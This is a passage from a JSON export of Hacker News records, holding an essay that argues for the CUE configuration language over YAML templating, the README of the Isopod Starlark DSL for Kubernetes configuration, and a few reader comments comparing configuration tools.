          "It occurred to me that the configuration hell is a consequence of Microservice-heavy approach: we have reduced complexity of cross-component interactions by compartmentalizing each component behind a hard boundary, and now we’re paying the price for this free lunch by trying to put those things back together and keeping them that way.<p>Turns out the complexity didn’t go anywhere, it was just biding it’s time, waiting for the right moment to strike back.<p>Damn you, entropy!"
        ],
        "id": "650c9bcf-ccef-4257-b028-109c706f50f8",
        "url_text": "Read the discussion on Hacker News, Reddit, and Lobste.rsDont be a YAML EngineerImagine that you are a new software engineer entering the industry. You thought you were ready after studying your theory and the weekend side projects. Now, you get hit with a wave of new tools and concepts out of nowhere. Microservices? REST? Cloud Computing? RPC (Whats an IDL)? Docker (Whats a container)? Kubernetes? Continuous Integration? Continuous Deployment? Even for veterans, like a frog in slowly boiling water, you look up one day and realize things have become complicated.How did this happen? Each of these things looks useful in isolation, but now you have to figure out how to use it best for yourself as well as with these other tools in concert. First a tool must be configured, usually in YAML (so much YAML). Now this tool needs to be integrated to work with everything else. If you are lucky, you may have an internal platform team to package and abstract the complexity for you. Otherwise, you are going to end up with a rube goldbergian system that wraps all these tools so you can coordinate configuration between everything just to maintain sanity.I think there is light at the end of the tunnel here, but even leading edge projects like Kubernetes suffer from this industry wide pathology we experience building software platforms.Kubernetes: Its Turtles All The Way DownYou start by hand writing YAML files and pushing them to a cluster with kubectl. Before resting on your laurels as a newly minted distributed systems engineer, you realize that you need a way to pass dynamic values to your YAML file. Enter the tool explosion; Nod along if you have ever done or considered using one of these techniques:Text Templating: Many are tempted to reach for text templating libraries like Jinja, etc. Most have experience using it for templating HTML, why not use it here? At this point you can get by with just simple scripts to template values then push to the cluster, or just go with something off the shelf. Trying to write a configuration file (basically a data structure described in text) with a text templating library is the road to tragedy. As anyone who tried to write a helm chart template knows, templates quickly become hairy and incredibly fragile. Because you are working with the template at the textual level, a template writer lacks the tools to build abstractions around the data itself and small things like indentation can break your template. I think I need to repeat this: Do not use text templating for data configuration.Data Layering: This is when you build an overlay inheritance mechanism on top of YAML, keeping the raw YAML but wrapping it in a tool that can merge these separate documents according to its own rules. kustomize would be the most well known tool now it that is it integrated into kubectl. This seems to work well enough and could be feasible for simple use cases. In comparison to data configuration languages though, this strategy breaks down when configurations grow in complexity and scale. Template writers lack abstraction and type validation that matters when things get complicated, as the semantics are locked into an opaque tool and not exposed as language features.Data Configuration Language (DCL): This is the most advanced form of data configuration we have today, if you absolutely need to manage configuration for a system now I would recommend one of these tools. If the previous techniques are what I call YAML Engineering, DCLs would be actual languages designed for defining data and working with data at a semantic level. Examples of DCLs are jsonnet (used in kubecfg/ksonnet), dhall (used in dhall-kubernetes), and starlark (used in isopod). Google internally uses a tool called borgcfg (which inspired kubecfg) which evaluates configurations in a jsonnet-like internal language to configure Borg (which inspired Kubernetes) deployments. As systems scale in complexity and size, DCLs have abstractions like types, functions, comprehensions, and conditionals to manage and create reusable configurations.So, if you want to anything more advanced than straight YAML you will need to adopt one of these approaches and integrate it with your development and release process. That will help as long as you are working directly with Kubernetes, but what about configuring your underlying infrastructure? If you are on a cloud platform like AWS or Azure, even a managed Kubernetes deployment requires a tool like CloudFormation or Terraform, which has or needs its own distinct abstractions to manage resources at that level of the stack. You cannot reuse the tooling invested in configuring Kubernetes and must yet again integrate another system for configuring the cloud provider at a lower level. The sound you hear is a turtle being stacked on another turtle.Complex Systems == Complex ConfigurationThis example with Kubernetes shows how difficult it is to manage configuration, but Kubernetes is just one of many declarative systems that show this problem. Any declarative systems and tools that grow sufficiently in size and complexity need to be abstracted but we lack common tools to do so. You may not think a Terraform configuration needs to be abstracted, but when dealing with many teams that need to deploy infrastructure in a consistent way, having reusable abstractions is incredibly valuable. Same for Continuous Integration. Maintaining a YAML file may be fine for a single project, but when your organization has hundreds of services, generating a consistent set of automation and checks is worth the effort.The main argument of this essay hits upon the cause of this issue:As systems grow and multiply in order to run at scale, the configuration also grows in size and complexity. The industry lacks the right tools to manage this growing configuration complexity.Innovation in platforms, like the cloud and Kubernetes, makes things that used to be too difficult and complex for a small team now just a simple API call away. But the loop needs to be closed on how we can build libraries that any organization can use to have a base of best practices for any platform. Even current DCLs, which I consider closer to the model we should use, lack key pieces to manage configuration at scale.CUE: Configure, Unify, ExecuteWe need a way to manage configuration that grows in size and needs to be used in many different systems. I think a tool to solve this would need two key properties:The tool is a language that has the primitives needed to create and maintain reusable, large scale configuration.The tool can orchestrate and push configuration to many different systems without having to create a new, custom tool just for that combination.There are many languages and configuration languages that attempt to solve this problem. CUE is a (new) data configuration language that uses a novel approach to solving the issue with a vision to tackle both what is needed to do configuration at large scale with a way to finally avoid the all too common tool wrapping that we see today. The creator of cuelang (this guy) worked on borgcfg at Google, where the learnings of managing configuration across a large company drives much of what makes cuelang a solution for our configuration problems today.Why CUE?Configuration Needs A Different Programming ModelIn the Kubernetes example before, I left out the option of using a a general purpose programming language. CUE is not even the first configuration language out there. Why should we pick a completely new tool instead of reusing something that already exists?CUE is based on a different model of logic programming that makes it well suited for configuration. The languages foundations make tasks like validation, templating, querying, and code generation first class features. CUE is designed around graph unification where sets of types, and values can be modeled as directed graphs and then unified to the most specific representation of all graphs. In CUE, the graphs are the config structures and values of the same key will simplify to the most specific value. The graph unification model is used successfully in computational linguistics, where a grammar definition of a human language can be thought of as 100K line configuration.This idea is much more intuitive to see with an example. Lets look at an example CUE definition:// Schema municipality: { name: string pop: int capital: bool } // Schema & Data largeCapital: municipality largeCapital: { name: string pop: >5M capital: true } // Data moscow: largeCapital moscow: { name: \"Moscow\" pop: 11.92M capital: true } We can see three separate structs defined here with varying mixtures of types and values defined for each. The combination of types and values in a single struct is significant here. In CUE, types are values. This means that types can be assigned to fields and can be immediately used to constrain values in the configuration. You can also see that fields become more constrained towards concrete values with each struct. largeCapital is a municipiality with a new constraint on the population size. moscow is a largeCapital with concrete values (the most specific type) for all fields. Between structs largeCapital and moscow, largeCapital subsumes moscow and moscow is an instance of largeCapital.If you want to go deeper I recommend reading The Logic of CUE to understand the theoretical foundation and what makes CUE different from other configuration languages. You can also watch this video from the creator if you prefer that. I think trying to go deeper into the theory would be me poorly rewording the original article. I would rather go into how the foundation of CUE enables features that are useful for configuration.Type Checking And Boilerplate RemovalGoing back to what we need from a new configuration tool, types and abstractions are the largest factors in managing large scale configuration. With types, we express constraints on data and declare intent across potentially many users. Types protect users from errors when defining configuration and serves as automatic documentation. Taking an example from the website:Spec :: { kind: string name: { first: !=\"\" // must be specified and non-empty middle?: !=\"\" // optional, but must be non-empty when specified last: !=\"\" } // The minimum must be strictly smaller than the maximum and vice versa. minimum?: int & <maximum maximum?: int & >minimum } // A spec is of type Spec spec: Spec spec: { knid: \"Homo Sapiens\" // error, misspelled field name: first: \"Jane\" name: last: \"Doe\" } In CUE, we can see what fields are needed for a Spec type as well as the constraints on each. CUEs type system is expressive, where fields can be marked simply by their type, to specifying optionality and constraints from other fields as well. This mixing of types and values is underrated. In constrast with JSON, one needs to generate a separate specification format (like OpenAPI) with significant effort to document and validate the JSON being consumed. With CUE, configuration can be checked and validated during evaluation without extra effort or tooling.Most of the current configuration tooling, both general purpose and data languages, focuses on removing boilerplate/duplicate code to reduce verbosity. Many choose to use an override model like inheritance (defining base types and modifying) due to developer familarity with the paradigm. This is a key factor to why I think DCLs have not seen widespread use in the industry. Although it would seem to be an obvious model, inheritance has problems in both small and large scale configuration. For small projects, defining abstractions early can be a large upfront ask with small payoff. After all, to benefit from deduplication there needs to be duplicate configuration in the first place (For the sake of clarity abstraction too early can be counterproductive). With CUE, defining the config grants automatic validation and documentation right out the gate; Paired with default values you can immediately cut down the effort to reuse common data.For large scale projects, inheritance creates deep layers of abstractions; It becomes difficult to tell where values are coming from in a config, much more so if the language has multiple mechanisms for abstraction (inheritance, mixins). At a practical level, deep hierarchies are common in configuration, and subtrees near the leaves can be challenging to modify. CUE takes a different approach with graph unification and disallows overrides. This improves readability as deep layering is prevented from the beginning; One does not need to trace through multiple files to see where a value came from. Although CUE does not have inheritance, it does have the concept of a value being an instance of another (the value lattice). This model is less flexible, but in return we get great clarity. To take a simple example, imagine we have an Animal class and we want to define both a Dog and Cat class. With inheritance, we could define Animal as the base type then selectively override and add fields to represent each respective subclass. Although workable, if we wanted to go further and represent each breed of Cat and Dog we could quickly run into issues as each layer of the hierarchy can choose to modify data as it chooses. In CUEs approach, instead of trying to override data at each layer, we choose to model Cat and Dog as instances of Animal. For both types, we take Animals definition but instead add constraints to bound what defines each animal. Even though we have the same hierarchy of types, at each layer the data can only become more specific for that subtype. Thanks to that for breeds we only need to further constrain what makes a Dog a Corgi and at each level we can see how the data was constrained to allow the final value.Scripting: Inversion of ControlConfiguration is never created for its own sake. The purpose of all configuration is to be fed to another system to do useful work with it. Especially today, we need to manage configuration between a dizzying amount of tools and services: Software as a Service (SaaS) offerings, Cloud vendors, Continous Integration, build tools, package managersthe list goes on. In the beginning, piping config files to various tools such as kubectl may be enough to get the job done. Eventually though, these tasks end up as part of a greater workflow that needs to be automated. Marcel describes a problem he has seen many times:At first using a general config lang is cute, piping results to kubectl and what have you. But this gets cumbersome, so one writes scripts. Then, as scripts are often inconvenient to distribute and use, so one turns this into a command line tool. These tools are typically domain specific. So sooner or later, this tool needs to be part of a larger control flow, and the whole process starts again. Ive been guilty of writing a bunch of such tools.Marcel van Lohuizen, CUE SlackThe resultant tools tend to consist of undifferentied glue code that is duplicated at each level of control. Even worse, the solution is hyper-specific to the combination of tools that needs to be integrated. The problem is almost asking for a more general, flexible approach.CUEs solution is an open, declarative scripting layer built on top of the configuration language. While configuration evaluation can remain hermetic (important for enabling CUE semantics), the scriping layer can freely combine injected data as well as functions to run various tasks in a dataflow pipeline. Data injection opens up many possibilities that can close the gap that other configuration languages miss. We can inject command line flags, data from the enviroment (environment variables, data fetched over the network), and computed data from the defined config that we need for complete automation pipelines.Today, we have incredible tool churn because we cannot easily use the same configuration between multiple systems (compatibility and accessibility). The script layer instead proposes to invert control. Instead of pulling configuration data into inaccessible scripts and tools, why not push the code closer to the data? The flow of data drives the need to endlessly wrap tools to work with multiple systems. Instead, we can define the automation where data and dataflow are first class citizens.Its hard to visualize what this means without an example. The scripting layer is still being worked on, but here is an example from running cue help cmd:package foo import \"tool/exec\" city: \"Amsterdam\" // Say hello! command hello: { var file: \"out.txt\" | string // save transcript to this file task ask: cli.Ask & { prompt: \"What is your name?\" response: string } // starts after ask task echo: exec.Run & { cmd: [\"echo\", \"Hello\", task.ask.response + \"!\"] stdout: string // capture stdout } // starts after echo task write: file.Append & { filename: var.file contents: task.echo.stdout } // also starts after echo task print: cli.Print & { contents: task.echo.stdout } } For CUE, files ending in _tool.cue are evaluated as script files with access to injected data as well as the command and task templates. Each command is given a name which can be called as the entrypoint; the hello command would be executed with cue cmd hello. This command asks for a name then writes a greeting to both stdout and a file. This workflow is implemented as a pipeline of tasks with structs used to define arguments. Since CUE can see which tasks input use another tasks output, we automatically get parallel pipelines through dataflow analysis. Tasks can cover all kinds of operations, one can see the currently available ones hereIntegration And PackagesCUE is a superset of JSON. By design, CUE aims to be useful when working with other formats; CUE supports automation to import and export to/from other data formats. Importing data and schemas into CUE (like JSON, YAML, Protocol Buffers, OpenAPI definitions) allows for managing configurations in an expressive and scalable way. Exporting to other formats enables compatibility when pushing evaluated CUE with other systems. After all, a configuration is not written for its own sake, but to be used somewhere else.The true implications of CUE code generation are realized in combination with the package system. CUE borrows Golangs package system, and plans on implementing minimal version selection with URI imports. With this, we can create reusable abstractions for configuration that have previously existed only in the realm of general programming.Take the Kubernetes example. Kubernetes is a declarative infrastructure state converger. Like a cloud provider, Kubernetes has a massive API surface spread over multiple resources. On top of that, Kubernetes allows for defining custom resources from external sources. To manually write a DCL library to cover all of the API surface would be a massive undertaking and would quickly become out of date. With CUE, we can generate CUE code from the OpenAPI specification. With the full resource API covered, we can layer our own opinionated libraries on top. Maybe you are a platform engineer at a company that wants to ensure everyone defines deployments with the required annotations, labels, and uses the company container repository. The community can also create libraries that encourage best practices and the package system makes it simple to distribute and integrate in any workflow. If the underlying resources were to change, it is straightforward to autogenerate the CUE code and check if the libraries are still compatible.The Automation DreamPutting all these ideas together, we end up with a vision for future configuration. We can have libraries for not only configuring applications but also libraries of automation that run end-to-end workflows for pushing that data to systems. CUEs design enables configuration at scale: organizations can define constraints and templates at a high level, and users layer specific values to make concrete definitions. Organizations find it easier to enforce best practices and policy, and front line engineers get templates and automation out of the box to become productive that much quicker. With distributed packaging, we are not limited to what only our teams can create but can leverage best practices and knowledge from the wider industry.CUE And YouAs of this writing, CUE is a pretty new (alpha) language. There is still much work to be done to reach the complete vision, especially in the integrations with other languages, platforms, and data formats. Fortunately, any improvements to the ecosystem can be easily shared for everyone to use.If I were to summarize the main reason to choose CUE, it is because it chooses to build from a theoretical foundation that makes it a true contender for configuration needs. So many of the useful features CUE provides fall out from its properties (commutative, associative, and idempotent). In an industry where the way we work is becoming more complicated, CUE has come along to make things much more manageable.If any of these people apply to you:A developer who wants to use Kubernetes/Cloud in an effective wayAn application developer who wants to create easy to share automation for a projectA platform developer who wants to create useful templates for every team to useAn architect who wants a simple way to enforce consistent policy across an organizationTired of writing so much YAMLyou should look into CUE.Edit 2019-12-08: Improve tone consistency; Rewrite CUE code to be idiomatic ",
        "_version_": 1718527435943706625
      },
      {
        "story_id": [21159155],
        "story_author": ["twakefield"],
        "story_descendants": [11],
        "story_score": [36],
        "story_time": ["2019-10-04T16:19:37Z"],
        "story_title": "Isopod: Expressive DSL Framework for Kubernetes Config",
        "search": [
          "Isopod: Expressive DSL Framework for Kubernetes Config",
          "https://github.com/cruise-automation/isopod",
          "Isopod Isopod is an expressive DSL framework for Kubernetes configuration. Without intermediate YAML artifacts, Isopod renders Kubernetes objects as Protocol Buffers, so they are strongly typed and consumed directly by the Kubernetes API. With Isopod, configurations are scripted in Starlark, a Python dialect by Google also used by Bazel and Buck build systems. Isopod offers runtime built-ins to access services and utilities such as Vault secret management, Kubernetes apiserver, HTTP requester, Base64 encoder, and UUID generator, etc. Isopod uses separate runtime for unit tests to mock all built-ins, providing the test coverage not possible before. A 5-min read, this medium post explains the inefficiency of existing YAML templating tools when dealing with values not statically known and complicated control logics such as loops and branches. It also gives simple code examples to show why Isopod is an expressive, hermetic, and extensible solution to configuration management in Kubernetes. Isopod Build Main Entryfile Clusters gke() onprem() Addons Generate Addons Load Remote Isopod Modules Built-ins kube Methods: kube.put kube.delete kube.put_yaml kube.get kube.exists kube.from_str, kube.from_int Vault Methods: vault.read vault.write vault.exist Helm Methods: helm.apply Misc base64.{encode, decode} uuid.{v3, v4, v5} http.{get, post, patch, put, delete} hash.{sha256, sha1, md5} sleep error Testing Dry Run Produces YAML Diffs Diff filtering License Contributions Build $ go version go version go1.14 darwin/amd64 $ GO111MODULE=on go build Main Entryfile Isopod will call the clusters(ctx) function in the main Starlark file to get a list of target clusters. For each of such clusters, isopod will call addons(ctx) to get a list of addons for configuration rollout. Example: CLUSTERS = [ onprem(env=\"dev\", cluster=\"minikube\", vaultkubeconfig=\"secret/path\"), gke( env=\"prod\", cluster=\"paas-prod\", location=\"us-west1\", project=\"cruise-paas-prod\", use_internal_ip=\"false\", # default to \"false\", which uses public endpoint ), ] def clusters(ctx): if ctx.cluster != None: return [c for c in CLUSTERS if c.cluster == ctx.cluster] elif ctx.env != None: return [c for c in CLUSTERS if c.env == ctx.env] return CLUSTERS def addons(ctx) return [ addon(\"ingress\", \"configs/ingress.ipd\", ctx), ] Clusters The ctx argument to clusters(ctx) comes from the command line flag --context to Isopod. This flag takes a comma-separated list of foo=bar and makes these values available in Starlark as ctx.foo (which gives \"bar\"). Currently Isopod supports the following clusters, and could easily be extended to cover other Kubernetes vendors, such as EKS and AKS. gke() Represents a Google Kubernetes Engine. Authenticates using Google Cloud Service Account Credentials or Google Default Application Credentials. Requires the cluster, location and project fields, while optionally takes use_internal_ip field to connect API server via private endpoint. Additional fields are allowed. onprem() Represents an on-premise or self-managed Kubernetes cluster. Authenticates using the kubeconfig file or Vault path containing the kubeconfig. No fields are required, though setting the vaultkubeconfig field to the path in Vault where the KubeConfig exists is necessary to utilize this auth method. Addons The ctx argument to addons(ctx) contains all fields of the chosen cluster. For example, say the cluster is gke( env=\"prod\", cluster=\"paas-prod\", location=\"us-west1\", project=\"cruise-paas-prod\", use_internal_ip=\"false\", # default to \"false\", which uses public endpoint ), Then, each addon may access the cluster information as ctx.env to get \"prod\" and ctx.location to get \"us-west1\". Accessing nonexistant attribute ctx.foo will get None. Each addon is represented using the addon() Starlark built-in, which takes three arguments, for example addon(\"name\", \"entry_file.ipd\", ctx). The first argument is the addon name, used by the --match_addon feature. The thrid is optional and represents the ctx input to addons(ctx) to make the cluster attributes available to the addon. Each addon must implement install(ctx) and remove(ctx) functions. More advanced examples can be found in the examples folder. Example Nginx addon: appsv1 = proto.package(\"k8s.io.api.apps.v1\") corev1 = proto.package(\"k8s.io.api.core.v1\") metav1 = proto.package(\"k8s.io.apimachinery.pkg.apis.meta.v1\") def install(ctx): metadata = metav1.ObjectMeta( name=\"nginx\", namespace=\"example\", labels={\"app\": \"nginx\"}, ) nginxContainer = corev1.Container( name=metadata.name, image=\"nginx:1.15.5\", ports=[corev1.ContainerPort(containerPort=80)], ), deploySpec = appsv1.DeploymentSpec( replicas=3, selector=metav1.LabelSelector(matchLabels=metadata.labels), template=corev1.PodTemplateSpec( metadata=metadata, spec=corev1.PodSpec( containers=[nginxContainer], ), ), ) kube.put( name=metadata.name, namespace=metadata.namespace, data=[appsv1.Deployment( metadata=metav1.ObjectMeta(name=metadata.name), spec=deploySpec, )], ) Generate Addons You might come from a place where you have a yaml file, but you want to derive an isopod addon from it. It can be cumbersome to re-write huge yaml files in Starlark. So isopod offers a convenience command to generate the Starlark code based on a yaml or json input file containing any kubernetes API object: isopod generate runtime/testdata/clusterrolebinding.yaml > addon.ipd For now all k8s.io resources are supported. Load Remote Isopod Modules Similar to Bazel's WORKSPACE file, the isopod.deps file allows you to define remote and versioned git modules to import to local modules. For example, git_repository( name=\"isopod_tools\", commit=\"dbe211be57bc27b947ab3e64568ecc94c23a9439\", remote=\"https://github.com/cruise-automation/isopod.git\", ) To import remote modules, use load(\"@target_name//path/to/file\", \"foo\", \"bar\"), for example, load(\"@isopod_tools//examples/helpers.ipd\", \"health_probe\", \"env_from_field\", \"container_port\") ... spec=corev1.PodSpec( containers=[corev1.Container( name=\"nginx-ingress-controller\", image=\"quay.io/kubernetes-ingress-controller/nginx-ingress-controller:0.22.0\", env=[ env_from_field(\"POD_NAME\", \"metadata.name\"), env_from_field(\"POD_NAMESPACE\", \"metadata.namespace\"), ], livenessProbe=health_probe(10254), readinessProbe=health_probe(10254), ports=[ container_port(\"http\", 80), container_port(\"https\", 443), container_port(\"metrics\", 10254), ], )], ) To import remote addon files, use addon(\"addon_name\", \"\"@addon_name//path/to/file\", ctx), for example, isopod.deps: git_repository( name=\"versioned_addon\", commit=\"1.0.0\", remote=\"https://github.com/cruise-automation/addon.git\", ) ... main.ipd: def addons(ctx): if ctx.cluster == None: error(\"`ctx.cluster' not set\") if ctx.foobar != None: error(\"`ctx.foobar' must be `None', got: {foobar}\".format( foobar=ctx.foobar)) return [ addon(\"addon_name\", \"@addon_name//addon/addon.ipd\", ctx), ] By default Isopod uses $(pwd)/isopod.deps, which you can override with --deps flag. Built-ins Built-ins are pre-declared packages available in Isopod runtime. Typically they perform I/O to Kubernetes, Vault, GCP and other resources but could be used for break-outs into other operations not supported by the main Starlark interpreter. Currently these build-ins are supported: kube Built-in for managing Kubernetes objects. Methods: kube.put Updates (creates if it doesn't already exist) object in Kubernetes. kube.put( name = \"nginx-role\", namespace = \"nginx-ingress\", # Optional Kubernetes API Group parameter. If not set, will attempt to # deduce the group from message type but since Kubernetes API Group names # are highly irregular, this may fail. api_group = 'rbac.authorization.kubernetes.io', data = [ rbacv1.Role(), ], ) Supported args: name - Name (.metadata.name) of the resource namespace (Optional) - Namespace (.metadata.namespace) of the resource api_group (Optional) - API group of the resource. If not provided, Isopod runtime will attempt to deduce the resource from just Proto type name which is unreliable. It is recommended to set this for all objects outside of core group. Optionally, version can also be specified after a /, example: apiextensions.k8s.io - specify the group only, version is implied from Proto or from runtime. apiextensions.k8s.io/v1 - specify both group and version. subresource (Optional) - A subresource specifier (e.g /status). data - A list of Protobuf definitions of objects to be created. kube.delete Deletes object in Kubernetes. # kwarg key is resource name, value is <namespace>/<name> (just <name> for # non-namespaced resources). kube.delete(deployment=\"default/nginx\") # api_group can optionally be provided to remove ambuguity (if multiple # resources by the same name exist in different API Groups or different versions). kube.delete(clusterrole=\"nginx\", api_group = \"rbac.authorization.k8s.io/v1\") kube.put_yaml Same as put but for YAML/JSON data. To be used for CRDs and other custom types. kube.put usage is preferred for the standard set of Kubernetes types. ark_config = \"\"\" apiVersion: ark.heptio.com/v1 kind: Config metadata:\" namespace: ark-backup name: default backupStorageProvider: name: gcp bucket: test-ark-backup persistentVolumeProvider: name: gcp \"\"\" kube.put_yaml( name = \"ark-config\", namespace = \"backup\", data = [ark_config]) # Alternatively render from native Starlark struct object via JSON: ark_config = struct( apiVersion = \"ark.heptio.com/v1\", kind = \"Config\", metadata = struct( name = \"ark-backup\", namespace = \"default\", ), backupStorageProvider = struct( name = \"gcp\", bucket = \"test-ark-backup\", ), persistentVolumeProvider = struct( name = \"gcp\", ), ) kube.put_yaml( name = \"ark-config\", namespace = \"backup\", data = [ark_config.to_json()]) kube.get Reads object from API Server. If wait argument is set to duration (e.g 10s) will block until the object is successfully read or timer expires. If json=True optional argument is provided, will render object as unstructured JSON represented as Starlark dict at top level. This is useful for CRDs as they typically do not support Protobuf representation. # Wait 60s for Service Account token secret. secret = kube.get(secret=namespace+\"/\"+serviceaccount.secrets[0].name, wait=\"60s\") # Get ClusterRbacSyncConfig CRD. cadmin = kube.get(clusterrbacsyncconfig=\"cluster-admin\", api_group=\"rbacsync.getcruise.com\", json=True) It is also possible to receive a list of kubernetes objects. They can be filtered as defined in the API documentation. # Get all pods in namespace kube-system. pods = kube.get(pod=\"kube-system/\") # Get all pods with label component=kube-apiserver pods = kube.get(pod=\"kube-system/?labelSelector=component=kube-apiserver\") kube.exists Checks whether a resource exists. If wait argument is set to duration (e.g 10s) will block until the object is successfully read or timer expires. # Assert that the resource doesn't exist. e = kube.exists(secret=namespace+\"/\"+serviceaccount.secrets[0].name, wait=\"10s\") assert(e != True, \"Fail: resource shouldn't exist\") kube.from_str, kube.from_int Convert Starlark string and int types to corresponding *instr.IntOrString protos. appsv1.RollingUpdateDaemonSet( maxUnavailable = kube.from_str(\"10%\"), ) Vault Vault break-out allows reading/writing values from Enterprise Vault. Methods: vault.read Reads data from Vault path as Starlark dict vault.write Writes kwargs to Vault path vault.exist Checks if path exists in Vault Example usage: if not vault.exist(\"secret/lidar/stuff\"): vault.write(\"secret/lidar/stuff\", w1=\"hello\", w2=\"world!\") data = vault.read(\"secret/infra/myapp\") print(data[\"w1\"] + \" \" + data[\"w2\"]) Helm Helm built-in renders Helm charts and applies the resource manifest changes. Methods: helm.apply Applies resource changes. globalValues = \"\"\" global: priorityClassName: \"cluster-critical\" \"\"\" pilotValues = \"\"\" pilot: replicaCount: 3 image: docker.io/istio/pilot:v1.2.3 traceSampling: 50.0 \"\"\" pilotOverlayValues = { \"pilot\": { \"traceSampling\": 100.0, } } helm.apply( release_name = \"istio-pilot\", chart = \"//charts/istio/istio-pilot\", namespace = \"istio-system\", values = [ yaml.unmarshal(globalValues), yaml.unmarshal(pilotValues), pilotOverlayValues ] ) Supported args: release_name - Release Name for the Helm chart. chart - Source Path of the chart. This can be a full path or a path relative to the working directory. Having a leading double-slash (//) will make it relative path. namespace (Optional) - Namespace (.metadata.namespace) of the resources values (Optional) - A list of Starlark Values used as input values for the charts. The ordering of a list matters, and the elements get overridden by the trailing values. Misc Various other utilities are available as Starlark built-ins for convenience: base64.{encode, decode} Translate string values to/from base64 uuid.{v3, v4, v5} Produce corresponding flavor of UUID values http.{get, post, patch, put, delete} Sends corresponding HTTP request to specified url. Returns response body as string, if present. Errors out on non-2XX response code. Will follow redirects (stops after 10 consecutive requests). Arguments: url - URL to send request to (required). headers - optional header dict (values are either string for single-value headers or list for multiple-value headers). data - optionally send data in the body of the request (takes string). hash.{sha256, sha1, md5} Returns an integer hash value. Useful applied to an env var for forcing a redeploy when a config or secret changes. sleep Pauses execution for specified duration (requires Go duration string). error Interrupts execution and return error to the user (requires string error message). Testing isopod test command allows addon creators to write hermetic unit tests on their addons. Unit tests must be contained inside files with a _test.ipd suffix and Isopod runtime will call every top-level method defined in that file as a separate test, execute it and report the result. Built-in modules that allow external access (like kube and vault) are stubbed (faked) out in unit test mode so that tests are hermetic. Intended pattern is to import the addon config files from the test, then call their methods and test the results with assert built-in (only supported in test mode). Example test: # Load ingress addon config and expose its \"install\" method. load(\"testdata/ingress.ipd\", \"install\") def test_install(t): # Test setup code. vault.write(\"secret/car/cert\", crt=\"foobar\") t.ctx.namespace = \"foobar\" # Call method we are testing (creates namespace from context). install(t.ctx) # Now extract data from our fake \"kube\" module and verify our tests # conditions. ns = kube.get(namespace=\"foobar\") assert(ns.metadata.name == \"foobar\", \"fail\") assert(ns.metadata.labels[\"foo\"] == \"bar\", \"fail\") The test command is designed to mimic standard go test. As such you can execute all test in subtree by running isopod test path/..., all test in a directory by running isopod test path/ and all tests from a current working subtree by running just isopod test. Dry Run Produces YAML Diffs Knowledge regarding the intended actions of any specification change is crucial for migration and everyday configuration updates. It prevents accidental removal of the critical fields that is otherwise uncatchable with just the new set of configurations. In dry run mode, Isopod not only verifies the legitimacy of the Starlark scripts but also informs the intended actions of the configuration change, by presenting the YAML diff between live objects in cluster and the generated configurations call \"head\". The result looks like the following. *** service.v1 example/nginx *** --- live +++ head @@ -14,8 +14,9 @@ port: 80 targetPort: 80 selector: app: nginx clusterIP: 192.168.17.77 - type: ClusterIP + type: NodePort sessionAffinity: None + externalTrafficPolicy: Cluster Diff filtering Many fields are managed by controllers and updated at runtime, which means they don't match the initially specified resource definition. In order to reduce noise when evaluating whether a dry-run is safe to apply, some filtering is performed on the current and requested resource definitions. By default, Isopod attempts to apply schema defaults and filter fields that are set by built-in kubernetes controllers at runtime. In addition to the default filters, Isopod users may specify filters in two ways, individually using --kube_diff_filter or in bulk with --kube_diff_filter_file. Individual Filters Example: $ isopod \\ --vault_token \"${vault_token}\" \\ --context \"cluster=${cluster}\" \\ --dry_run --nospin \\ --kube_diff_filter 'metadata.creationTimestamp' \\ --kube_diff_filter 'metadata.annotations[\"isopod.getcruise.com/context\"]' \\ --kube_diff_filter 'metadata.annotations[\"deployment.kubernetes.io/revision\"]' \\ --kube_diff_filter 'metadata.annotations[\"deprecated.daemonset.template.generation\"]' \\ --kube_diff_filter 'metadata.annotations[\"autoscaling.alpha.kubernetes.io/conditions\"]' \\ --kube_diff_filter 'metadata.annotations[\"cloud.google.com/neg-status\"]' \\ --kube_diff_filter 'metadata.annotations[\"runscope.getcruise.com/api-test-ids\"]' \\ --kube_diff_filter 'spec.template.spec.serviceAccount' \\ --kube_diff_filter 'spec.jobTemplate.spec.template.spec.serviceAccount' \\ install \\ \"${DEFAULT_CONFIG_PATH}\" Bulk Filters Example: $ cat > filters.txt <<EOF metadata.creationTimestamp metadata.annotations[\"isopod.getcruise.com/context\"] metadata.annotations[\"deployment.kubernetes.io/revision\"] metadata.annotations[\"deprecated.daemonset.template.generation\"] metadata.annotations[\"autoscaling.alpha.kubernetes.io/conditions\"] metadata.annotations[\"cloud.google.com/neg-status\"] metadata.annotations[\"runscope.getcruise.com/api-test-ids\"] spec.template.spec.serviceAccount spec.jobTemplate.spec.template.spec.serviceAccount EOF $ isopod \\ --vault_token \"${vault_token}\" \\ --context \"cluster=${cluster}\" \\ --dry_run --nospin \\ --kube_diff_filter_file \"filters.txt\" \\ install \\ \"${DEFAULT_CONFIG_PATH}\" License Copyright 2020 Cruise LLC Licensed under the Apache License Version 2.0 (the \"License\"); you may not use this project except in compliance with the License. Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License. Contributions Contributions are welcome! Please see the agreement for contributions in CONTRIBUTING.md. Commits must be made with a Sign-off (git commit -s) certifying that you agree to the provisions in CONTRIBUTING.md. ",
          "We switched to jkcfg (<a href=\"https://jkcfg.github.io\" rel=\"nofollow\">https://jkcfg.github.io</a>) for many of these same reasons and are very happy.   Text templating on structured data is wrong for many reasons, and kustomize is quite inflexible.   \"Eww Javascript\" but everybody knows it.<p>jkcfg reduced the amount of configuration code/data in our system by an order of magnitude or so.",
          "Isopod is notable for allowing the fetching of remote data that can then be used to configure the kubernetes objects. Terraform and pulumi are the only other ones that allow this. Bad about isopod is that the tool does not appear to automatically delete resources in the cluster after they are deleted from the code, and instead, a delete function must be called manually. That is a conceptual weakness compared to terraform and pulumi, and also a weakness compared to `kubectl apply --prune`."
        ],
        "story_type": ["Normal"],
        "url": "https://github.com/cruise-automation/isopod",
        "comments.comment_id": [21159757, 21160397],
        "comments.comment_author": ["bryanlarsen", "markbaikal"],
        "comments.comment_descendants": [1, 2],
        "comments.comment_time": [
          "2019-10-04T17:15:52Z",
          "2019-10-04T18:22:17Z"
        ],
        "comments.comment_text": [
          "We switched to jkcfg (<a href=\"https://jkcfg.github.io\" rel=\"nofollow\">https://jkcfg.github.io</a>) for many of these same reasons and are very happy.   Text templating on structured data is wrong for many reasons, and kustomize is quite inflexible.   \"Eww Javascript\" but everybody knows it.<p>jkcfg reduced the amount of configuration code/data in our system by an order of magnitude or so.",
